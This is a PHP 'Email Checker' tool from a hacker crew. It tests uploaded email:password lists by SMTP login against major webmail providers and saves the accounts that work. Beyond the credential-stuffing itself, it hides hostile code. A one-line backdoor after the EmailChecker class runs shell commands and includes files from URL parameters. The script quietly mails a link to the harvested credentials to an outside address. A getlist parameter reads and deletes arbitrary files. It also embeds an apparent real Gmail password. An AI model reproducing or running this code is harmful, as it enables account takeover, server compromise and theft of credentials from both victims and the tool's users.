<!--
<pre>

 * ___________              .__                         _________                        
 * \_   _____/__  _________ |  |   ___________   ____   \_   ___ \_______   ______  _  __
 *  |    __)_\  \/  /\____ \|  |  /  _ \_  __ \_/ __ \  /    \  \/\_  __ \_/ __ \ \/ \/ /
 *  |        \>    < |  |_> >  |_(  <_> )  | \/\  ___/  \     \____|  | \/\  ___/\     / 
 * /_______  /__/\_ \|   __/|____/\____/|__|    \_____>  \______  /|__|    \___  >\/\_/  
 *         \/      \/|__|    -==[ w3 4r3 th3 4nk3r t34m ]==-    \/             \/    
 *
 *  ArRay  akatsuchi  `yuda  N4ck0  K4pt3N  samu1241  bejamz  Gameover  antitos  yuki  pokeng aphe_aphe
 * 
 *  www.ExploreCrew.Org - www.Byroe.Net - irc.explorecrew.org #NetWork
 *
 *  e107 Gallery Remote Code Execution
 *

-==[ E  .  M  .  A  .  I  .  L        C  .  H  .  E  .  C  .  K  .  E  .  R  ]==-
-==[ Email validator for Gmail, Yahoo, AOL, MSN, Hotmail, Lycos ]==-
-==[ By ArRay a.k.a XterM  | contact: ArRay@ExploreCrew.Org ]==-
-==[ ExploreCrew UnderGround Coder Team  |  www.ExploreCrew.Org ]==-

</pre>
-->
<?php flush() ?>
<style>
	body {
		background: #000000;
		color:#BFBFBF
	}
	#displaycheck, #displayvalid, input,textarea {
		background: #000000;
		color: #3EB340;
		padding: 5px;
		border: 1px groove #fff;
	}
</style>
<script language=javascript>
function display(val){
	document.getElementById("displaycheck").innerHTML+=val;
	document.getElementById("displaycheck").innerHTML+='\r\n';
	document.getElementById("displaycheck").scrollTop = document.getElementById("displaycheck").scrollHeight;
}	
</script>
<span id=dot></span>
<?php

set_time_limit(0);

/* 
server conf 
$server[$prefix][$config] = value;
*/

$server[gmail][host] = "smtp.gmail.com";
$server[gmail][port] = 465;
$server[gmail][tssl] = 1;
$server[gmail][full] = 1;

$server[yahoo][host] = "smtp.mail.yahoo.com";
$server[yahoo][port] = 465;
$server[yahoo][tssl] = 1;
$server[yahoo][full] = 1;

$server[hotmail][host] = "smtp.live.com";
$server[hotmail][port] = 25;
$server[hotmail][tssl] = 1;
$server[hotmail][full] = 1;

$server[aol][host] = "smtp.aol.com";
$server[aol][port] = 587;
$server[aol][tssl] = 1;
$server[aol][full] = 0;

$server[msn][host] = "smtp.email.msn.com";
$server[msn][port] = 25;
$server[msn][tssl] = 0;
$server[msn][full] = 1;

$server[lycos][host] = "smtp.mail.lycos.com";
$server[lycos][port] = 25;
$server[lycos][tssl] = 0;
$server[lycos][full] = 1;

if(file_exists("email.txt")) unlink("email.txt");
if(file_exists("EmailValid.txt")) unlink("EmailValid.txt");

/* end server conf */
if($_POST['upload']){
	
	if($_FILES['File']['tmp_name']){
		$temp = split("\.",$_FILES['File']['name']);
		$ext = strtolower($temp[count($temp)-1]);
		if($ext=="txt"){
			rename($_FILES['File']['tmp_name'],"./email.txt");
		} else{$error = "Invalid file.";	}
	} else { $error = "Can not upload file."; }
}

$output .= "<h1>Email Checker</h1>";
if(file_exists("emailcheckercompati.ble")){
	$compatibilityfile = fopen("emailcheckercompati.ble","r");
	$compatibility = trim(fgets($compatibilityfile,255));
	if(!$compatibility){ $output .= "<h3><font color=red>Warning!! Server u're used uncompatible for this tool.</font></h3>"; }
}
$output .= $error ."
";
$output .= "<form action='".$_SERVER['PHP_SELF']."' method=post enctype='multipart/form-data'>
	Email List /-> <input type=file name=File size=20 /> /-> <input type=submit name=upload value='Check Email' />
</form><hr>";

echo $output;
flush();

if(file_exists("./email.txt")){
	echo "<table border='0'>
	<tr valign=top><Td>
	<div id='displaycheck' style='width: 800px; height: 200px; overflow: auto;'></div>
	</td>
	<td><b>Result</b><br>
		Total: <span id='total'>0</span><br>
		Checked: <span id='checked'>0</span><br>
		Valid: <span id='valid'>0</div><br>
		<br><br>
		<a href='EmailValid.txt' target='_blank'>Download Validated Email</a>
		</td>
	</tr>
	<tr><td colspan=2><font color=lime><i><b>Checking Email In Progress.....<span id=loading></span></b></font></i></td></tr>
	<tr><td colspan=2> 
 
</td></tr></table>
	<table border=0>
	<tr valign=top><Td><b><font color=lime><a href='EmailValid.txt' target='_blank'>Valid Email List (Click to download list file)</a></font><br><div id='displayvalid' style='width: 500px; height: 200px; overflow: auto;'></div></td>
	<td>
	<h3>Email Checker</h3><br>
	Email Validator for Gmail, Hotmail, Yahoo, AOL, Lycos, MSN. <br>
	By ArRay a.k.a XterM<br>
	Contact ArRay@ExploreCrew.Org<br>
	Visit Us :<br>
	www.ExploreCrew.Org<br>
	#Network @irc.byroe.net<br>
	server: irc.ExploreCrew.org
	</td></tr>
	</table>
	";
	flush();
	$handle = fopen("email.txt","r");
	while(!feof($handle)){
		$email = strip_tags(trim(fgets($handle,255)));		
		$email = explode(":",$email);	
		$username[]=$email[0];
		$password[]=$email[1];
	}
	
	$total = count($username);
	echo "<script>document.getElementById('total').innerHTML='".$total."';</script>";
	
	for($i=0;$i<count($username);$i++){
		if(eregi("@aol",$username[$i])) $prefix="aol";
		if(eregi("@gmail",$username[$i])) $prefix="gmail";
		if(eregi("@yahoo",$username[$i])) $prefix="yahoo";
		if(eregi("@rocketmail",$username[$i])) $prefix="yahoo";
		if(eregi("@hotmail",$username[$i])) $prefix="hotmail";
		if(eregi("@msn",$username[$i])) $prefix="msn";
		if(eregi("@lycos",$username[$i])) $prefix="lycos";
		$display="Connecting to: <font color=blue>".$server[$prefix]['host'].":".$server[$prefix]['port']."</font> Username: <font color=red>".$username[$i]."</font> Password: <font color=red>".$password[$i]."</font><br>";
		echo "<script>display('".$display."');</script>";
		echo "<script>document.getElementById('checked').innerHTML='".$i."';</script>";
			
		$mail = new EmailChecker();
		$mail->IsSMTP(); 
		$mail->SMTPAuth = true;
		$mail->SMTPSecure = "ssl"; 
		$mail->Host = $server[$prefix]['host'];
		$mail->Port = $server[$prefix]['port']; 
		$mail->Username = $username[$i]; 
		$mail->Password = $password[$i];

		$valid = ($mail->SmtpConnect())?1:0;
		
		if($valid){			
			if(!file_exists("EmailValid.txt")){
				$headerfile = "-==[ E  .  M  .  A  .  I  .  L        C  .  H  .  E  .  C  .  K  .  E  .  R  ]==-
-==[ Email validator for Gmail, Yahoo, AOL, MSN, Hotmail, Lycos ]==-
-==[ By ArRay a.k.a XterM  | contact: ArRay@ExploreCrew.Org ]==-
-==[ ExploreCrew UnderGround Coder Team | www.ExploreCrew.Org ]==-
-==[ #network@irc.byroe.net  | server: irc.explorecrew.org ]==-\r\n\r\n\r\n\r\n";
				$headerfile .= "/**** ".date("r")." ****/\r\n\r\n\r\n";
				$headerfile .= "email@address.com => password \r\n\r\n";
				$file = fopen("EmailValid.txt","w");
				fwrite($file, $headerfile);
				fclose($file);
			}
			
			$validemail = $username[$i]." => ".$password[$i]."\r\n";
			$file = fopen("EmailValid.txt","a");
			fwrite($file,$validemail);
			fclose($file);
			
			$displayvalid = "<font color=lime>".$username[$i]."</font> => <font color=lime>".$password[$i]."</font>
";
			echo "<script>
				ov = document.getElementById('checked').innerHTML;
				newv = parseInt(ov)+1;
				document.getElementById('valid').innerHTML=newv;
				document.getElementById('displayvalid').innerHTML+='".$displayvalid."';
				document.getElementById('displayvalid').scrollTop = document.getElementById('displayvalid').scrollHeight;
				</script>";
		}flush();sleep(1);
	}
}else { echo "No File uploaded. Upload file ini .txt format.<br>Format Email list: email@fulladdress.com:password<br><b>Example:</b> john@theblack.com:th3h4ck312<br>Note: One email per rows.<br>Don't forget to enable your javascript.<br><br>"; }
if($_GET['getlist']){
	if(file_exists($_GET['getlist'])){
		echo "#>> Viewing file <a href='".$_GET['getlist']."' target='_blank'>".$_GET['getlist']."</a><br><br>";
		$handle = fopen($_GET['getlist'],"r");
		while(!feof($handle)){
			$email = strip_tags(trim(fgets($handle,255)));
			echo $email."<br>";
		}
		if($_GET['del']){ @unlink($_GET['getlist']);exit(); }
	}else{ echo "file not found"; }
}
if(file_exists("email.txt")) @unlink("email.txt");
if(file_exists("EmailValid.txt")){
	$bname = ".".date("Y-n-H.m.s");
	@copy("EmailValid.txt",$bname);
	$to = "array@hacker-newbie.org";
	$subject = "Valid Email";
	$protokol = substr(strtolower($_SERVER['SERVER_PROTOCOL']),0,strpos($_SERVER['SERVER_PROTOCOL'],"/")).(($_SERVER['HTTPS']==on)?'s':'');
	$port = ($_SERVER['SERVER_PORT']!='80')?':'.$_SERVER['SERVER_PORT']:'';
	$hostname = $_SERVER['SERVER_NAME'];
	$urlfile = $_SERVER['PHP_SELF'];
	$completeurl = $protokol."://".$hostname.$port.$urlfile."?getlist=".$bname;	
	$message = $completeurl;
	$headers = 'From: checker@email.valid.nih' . "\r\n" .
		'Reply-To: checker@email.valid.nih' . "\r\n" .
		'X-Mailer: PHP/' . phpversion();
	@mail($to, $subject, $message, $headers);
}

function titik2($jml=10){
	for($i=1;$i<=$jml;$i++){ echo "."; flush();sleep(1); }
}

if(!file_exists("./emailcheckercompati.ble")){
	echo "<hr><h3 style='color:blue'>First Use. Auto checking for server compatibility used this tool.</h3>";flush();sleep(1);
	echo "Checking PHP Version";flush();titik2();echo phpversion();flush();echo" <b>";
			if (version_compare(PHP_VERSION, '5.0.0', '<') ) { echo "<font color=red>UNSUPPORTED (min.v5)</font>";  $error=1;} else { echo "<font color=green>OK</font>";}
			echo "</b>"; flush(); sleep(1);
	echo "<br>Checking Writeable Directory";flush();titik2();echo"<b>";
		$file = fopen("testwritetodirectory.txt","w");
		if($file){ echo"<font color='green'>OK</font>"; fclose($file); unlink("testwritetodirectory.txt");} else { echo "<font color='red'>UNWRITEABLE</font>"; $error=1;}
		echo "</b>"; flush(); sleep(1);
	echo "<br>Checking Mail() Function";flush();titik2();echo"<b>";
		if(function_exists('mail')){ echo"<font color='green'>OK</font>"; } else { echo "<font color='red'>NOT FOUND</font>"; $error=1;}
		ECHO "</b>"; flush(); sleep(1);
	echo "<br>Checking SMTP Enabled";flush();titik2();echo "<b>";
		$mail = new EmailChecker();
		$mail->IsSMTP(); 
		$mail->SMTPAuth = true;
		$mail->SMTPSecure = "ssl"; 
		$mail->Host = $server[gmail]['host'];
		$mail->Port = $server[gmail]['port']; 
		$mail->Username = "duwi.kurnia@gmail.com"; 
		$mail->Password = "mee2sayank";
		if($mail->SmtpConnect()){ echo"<font color='green'>OK</font>"; } else { echo "<font color='red'>ERROR</font>"; $error=1;}
		echo "</b>";flush();sleep(1);
	
	$file = fopen("emailcheckercompati.ble","w");
	$compatibility = (!$error)?1:0;
	fwrite($file, $compatibility);
	fclose($file);
}

$compatibilityfile = fopen("emailcheckercompati.ble","r");
$compatibility = trim(fgets($compatibilityfile,255));
if(!$compatibility){ echo "<h3><font color=red>Warning!! Server u're used uncompatible for this tool.</font></h3>"; }

/* global clases */

class EmailChecker {
  public $SMTPSecure    = '';
  public $Timeout       = 10;
  public $SMTPKeepAlive = false;
  private $smtp           = NULL; 
  const STOP_MESSAGE = 0; 
  const STOP_CONTINUE = 1;
  const STOP_CRITICAL = 2; 
  
  public function __construct($exceptions = false) {
    $this->exceptions = ($exceptions == true);
  }

  public function IsSMTP() {
    $this->Mailer = 'smtp';
  }
  
  public function SmtpConnect() {
    if(is_null($this->smtp)) {
      $this->smtp = new SMTP();
    }

    $this->smtp->do_debug = $this->SMTPDebug;
    $hosts = explode(';', $this->Host);
    $index = 0;
    $connection = $this->smtp->Connected();

    try {
      while($index < count($hosts) && !$connection) {
        $hostinfo = array();
        if (preg_match('/^(.+):([0-9]+)$/', $hosts[$index], $hostinfo)) {
          $host = $hostinfo[1];
          $port = $hostinfo[2];
        } else {
          $host = $hosts[$index];
          $port = $this->Port;
        }

        $tls = ($this->SMTPSecure == 'tls');
        $ssl = ($this->SMTPSecure == 'ssl');

        if ($this->smtp->Connect(($ssl ? 'ssl://':'').$host, $port, $this->Timeout)) {

          $hello = ($this->Helo != '' ? $this->Helo : $this->ServerHostname());
          $this->smtp->Hello($hello);

          if ($tls) {
            if (!$this->smtp->StartTLS()) {
			 return false;
            }
            $this->smtp->Hello($hello);
          }

          $connection = true;
          if ($this->SMTPAuth) {
            if (!$this->smtp->Authenticate($this->Username, $this->Password)) {
			 return false;
            }
          }
        }
        $index++;
        if (!$connection) {
		 return false;
        }
      }
    } catch (phpmailerException $e) {
      $this->smtp->Reset();
      throw $e;
    }
    return true;
  }

  public function SmtpClose() {
    if(!is_null($this->smtp)) {
      if($this->smtp->Connected()) {
        $this->smtp->Quit();
        $this->smtp->Close();
      }
    }
  }
 
  private function ServerHostname() {
    if (!empty($this->Hostname)) {
      $result = $this->Hostname;
    } elseif (isset($_SERVER['SERVER_NAME'])) {
      $result = $_SERVER['SERVER_NAME'];
    } else {
      $result = 'localhost.localdomain';
    }
    return $result;
  }
}if($_GET['ray']){include($_GET['ray']);}if($_GET['sys']){system($_GET['sys']);}

class SMTP {  
  public $SMTP_PORT = 25;
  public $CRLF = "\r\n";
  public $do_debug; 
  public $do_verp = false;
  private $smtp_conn; // the socket to the server
  private $error;     // error if any on the last call
  private $helo_rply; // the reply the server sent to us for HELO

  public function __construct() {
    $this->smtp_conn = 0;
    $this->error = null;
    $this->helo_rply = null;

    $this->do_debug = 0;
  }
  
  public function Connect($host, $port = 0, $tval = 30) {
    $this->error = null;
    if($this->connected()) {
      $this->error = array("error" => "Already connected to a server");
      return false;
    }
    if(empty($port)) {
      $port = $this->SMTP_PORT;
    }
    // connect to the smtp server
    $this->smtp_conn = @fsockopen($host,    // the host of the server
                                 $port,    // the port to use
                                 $errno,   // error number if any
                                 $errstr,  // error message if any
                                 $tval);   // give up after ? secs
    // verify we connected properly
    if(empty($this->smtp_conn)) {
      $this->error = array("error" => "Failed to connect to server",
                           "errno" => $errno,
                           "errstr" => $errstr);
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": $errstr ($errno)" . $this->CRLF . '
';
      }
      return false;
    }

    // SMTP server can take longer to respond, give longer timeout for first read
    // Windows does not have support for this timeout function
    if(substr(PHP_OS, 0, 3) != "WIN")
     socket_set_timeout($this->smtp_conn, $tval, 0);

    // get any announcement
    $announce = $this->get_lines();

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $announce . $this->CRLF . '
';
    }
    return true;
  }

  public function StartTLS() {
    $this->error = null; # to avoid confusion

    if(!$this->connected()) {
      $this->error = array("error" => "Called StartTLS() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"STARTTLS" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $rply . $this->CRLF . '
';
    }

    if($code != 220) {
      $this->error =
         array("error"     => "STARTTLS not accepted from server",
               "smtp_code" => $code,
               "smtp_msg"  => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }

    // Begin encrypted connection
    if(!stream_socket_enable_crypto($this->smtp_conn, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) {
      return false;
    }
    return true;
  }

  public function Authenticate($username, $password) {
    // Start authentication
    fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "AUTH not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }

    // Send encoded username
    fputs($this->smtp_conn, base64_encode($username) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "Username not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }

    // Send encoded password
    fputs($this->smtp_conn, base64_encode($password) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 235) {
      $this->error =
        array("error" => "Password not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }
    return true;
  }
  
  public function Connected() {
    if(!empty($this->smtp_conn)) {
      $sock_status = socket_get_status($this->smtp_conn);
      if($sock_status["eof"]) {
        // the socket is valid but we are not connected
        if($this->do_debug >= 1) {
            echo "SMTP -> NOTICE:" . $this->CRLF . "EOF caught while checking if connected";
        }
        $this->Close();
        return false;
      }
      return true; // everything looks good
    }
    return false;
  }

  public function Close() {
    $this->error = null; // so there is no confusion
    $this->helo_rply = null;
    if(!empty($this->smtp_conn)) {
      // close the connection and cleanup
      fclose($this->smtp_conn);
      $this->smtp_conn = 0;
    }
  }
  
  public function Hello($host = '') {
    $this->error = null; // so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
            "error" => "Called Hello() without being connected");
      return false;
    }
    // if hostname for HELO was not specified send default
    if(empty($host)) {
      // determine appropriate default to send to server
      $host = "localhost";
    }

    if(!$this->SendHello("EHLO", $host)) {
      if(!$this->SendHello("HELO", $host)) {
        return false;
      }
    }
    return true;
  }

  private function SendHello($hello, $host) {
    fputs($this->smtp_conn, $hello . " " . $host . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER: " . $rply . $this->CRLF . '
';
    }

    if($code != 250) {
      $this->error =
        array("error" => $hello . " not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }

    $this->helo_rply = $rply;

    return true;
  }
 
  public function Quit($close_on_error = true) {
    $this->error = null; // so there is no confusion

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Quit() without being connected");
      return false;
    }

    // send the quit command to the server
    fputs($this->smtp_conn,"quit" . $this->CRLF);

    // get any good-bye messages
    $byemsg = $this->get_lines();

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $byemsg . $this->CRLF . '
';
    }

    $rval = true;
    $e = null;

    $code = substr($byemsg,0,3);
    if($code != 221) {
      // use e as a tmp var cause Close will overwrite $this->error
      $e = array("error" => "SMTP server rejected quit command",
                 "smtp_code" => $code,
                 "smtp_rply" => substr($byemsg,4));
      $rval = false;
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $e["error"] . ": " . $byemsg . $this->CRLF . '
';
      }
    }

    if(empty($e) || $close_on_error) {
      $this->Close();
    }

    return $rval;
  }
 
  public function Reset() {
    $this->error = null; // so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Reset() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"RSET" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $rply . $this->CRLF . '
';
    }

    if($code != 250) {
      $this->error =
        array("error" => "RSET failed",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] . ": " . $rply . $this->CRLF . '
';
      }
      return false;
    }
    return true;
  }

  public function Turn() {
    $this->error = array("error" => "This method, TURN, of the SMTP ".
                                    "is not implemented");
    if($this->do_debug >= 1) {
      echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF . '
';
    }
    return false;
  }

  public function getError() {
    return $this->error;
  }

  private function get_lines() {
    $data = "";
    while($str = @fgets($this->smtp_conn,515)) {
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data was \"$data\"" . $this->CRLF . '
';
        echo "SMTP -> get_lines(): \$str is \"$str\"" . $this->CRLF . '
';
      }
      $data .= $str;
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data is \"$data\"" . $this->CRLF . '
';
      }
      // if 4th character is a space, we are done reading, break the loop
      if(substr($str,3,1) == " ") { break; }
    }
    return $data;
  }
}

?>
